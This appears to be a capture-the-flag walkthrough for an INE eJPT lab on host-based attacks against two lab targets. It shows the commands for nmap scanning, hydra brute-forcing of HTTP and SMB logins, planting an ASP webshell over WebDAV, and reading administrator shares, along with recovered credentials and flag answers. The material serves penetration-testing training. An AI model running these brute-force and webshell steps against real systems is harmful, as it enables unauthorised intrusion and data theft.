# Host-Network-Penetration-Testing-System-Host-Based-Attacks-CTF-1-EJPT

#### Host & Network Penetration Testing: System-Host Based Attacks CTF 1

Targets
**http://target1.ine.local** and **http://target2.ine.local**.

IP's
target1 - 10.5.17.190
target2  -  10.5.26.51

```
nmap -sV -sC -p- target1.ine.local
```
![image alt](https://github.com/Adithya-satya11/images/blob/main/Pasted%20image%2020251120101204.png?raw=true)
![image alt](https://github.com/Adithya-satya11/images/blob/main/Pasted%20image%2020251120101244.png?raw=true)


We have discovered that multiple ports are open. In port 80 we have microsoft IIS httpd 10.0 server. It has a authentication.

Let's have a look at web

![image alt](https://github.com/Adithya-satya11/images/blob/main/Pasted%20image%2020251120101843.png?raw=true)

Let's perform a brute force attack using hydra
NOTE : We have a hint that the user name is **bob**
```
hydra -l bob -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt http-get target1.ine.local /
```

![image alt](https://github.com/Adithya-satya11/images/blob/main/Pasted%20image%2020251120102341.png?raw=true)

we got the password for bob

>> bob:password_123321

Let's login 

![image alt](https://github.com/Adithya-satya11/images/blob/main/Pasted%20image%2020251120102533.png?raw=true)


There is no much information 
let's try to find other directories
```
dirb http://target1.ine.local/ -u bob:password_123321
```

![image alt](https://github.com/Adithya-satya11/images/blob/main/Pasted%20image%2020251120103017.png?raw=true)


let's have a look at each page

In /webdav/ directory we have our first flag (i.e flag1.txt)

![image alt](https://github.com/Adithya-satya11/images/blob/main/Pasted%20image%2020251120103232.png?raw=true)



`d2eddc407e1e4b049a4023d3e16b1bc0`  this is our flag

Let's dig more through webdav/ 

Let's see what files can we upload 
```
davtest -auth bob:password_123321 -url http://target1.ine.local/webdav/ 
```

![image alt](https://github.com/Adithya-satya11/images/blob/main/Pasted%20image%2020251120103908.png?raw=true)
![image alt](https://github.com/Adithya-satya11/images/blob/main/Pasted%20image%2020251120103952.png?raw=true)


From web we can see the uploaded file directory

![image alt](https://github.com/Adithya-satya11/images/blob/main/Pasted%20image%2020251120104123.png?raw=true)


Let's have a try with `cadaver` command

```
cadaver http://target1.ine.local/webdav/
```


![image alt](https://github.com/Adithya-satya11/images/blob/main/Pasted%20image%2020251120104512.png?raw=true)


we tried to login with bob user. we got in 
we tried to upload `webshell.asp` file
NOTE : give location /usr/share/webshells/asp/webshell.asp

Let's access that file in web

![image alt](https://github.com/Adithya-satya11/images/blob/main/Pasted%20image%2020251120104752.png?raw=true)


we have a shell

run the command 
```
cd C:// && dir
```


```
cd C:// && type flag2.txt
```

this reveals our flag

![image alt](https://github.com/Adithya-satya11/images/blob/main/Pasted%20image%2020251120105031.png?raw=true)


`edf1d78ca4de4873883f8b50e518bc55`  this is our flag.




Now, lets move to other target (target2.ine.local)

perform a nmap scan
```
nmap -sV -sC -p- target2.ine.local
```

![image alt](https://github.com/Adithya-satya11/images/blob/main/Pasted%20image%2020251120105437.png?raw=true)
![image alt](https://github.com/Adithya-satya11/images/blob/main/Pasted%20image%2020251120105512.png?raw=true)


We see so many open ports lets have a look at port 445 SMB
we see a windows server 2019 running at port 445

lets try to connect to smb
```
smbclient -L target2.ine.local
```
It has a authentication 
Lets see enum4linux
```
enum4linux target2.ine.local -SU
```
we didn't got anything

lets try brute force using the given files with hydra
```
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt smb://target2.ine.local 
```
![image alt](https://github.com/Adithya-satya11/images/blob/main/Pasted%20image%2020251120111029.png?raw=true)


we have some logins 
let's check user shares with  smbclient  for user administrator
```
smbclient -L \\\\target2.ine.local\\ -U administrator
```

![image alt](https://github.com/Adithya-satya11/images/blob/main/Pasted%20image%2020251120111741.png?raw=true)

lets go to `C$` shares
```
smbclient \\\\target2.ine.local\\C$ -U administrator
```
![image alt](https://github.com/Adithya-satya11/images/blob/main/Pasted%20image%2020251120111956.png?raw=true)

we have a file called flag3.txt , this reveal our third flag
we have to download flag3.txt by
```
get flag3.txt 
```
`91bd8ee6611d4134a419def66f646fdb`  this is our flag


Now for flag4 , go to Users > administrator > Desktop
you can see flag4.txt file 
Download it , It will reveals our flag

`c364ecdc791040d2ad796635bbc925ca`  this is our flag.

